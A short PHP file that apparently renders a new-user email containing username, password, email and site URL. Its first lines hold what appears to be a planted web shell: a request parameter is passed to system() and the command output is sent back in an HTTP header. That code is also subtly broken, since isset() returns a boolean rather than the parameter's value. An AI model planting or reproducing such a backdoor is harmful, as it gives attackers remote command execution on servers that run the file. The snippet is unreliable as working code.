<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 

$message = trans('emails.new_user_message', array(
	'username' => $username,
	'password' => $password,
	'email' => $email,
	'url' => App::url()
));

echo View::make('emails.template')->with('message', $message)->render();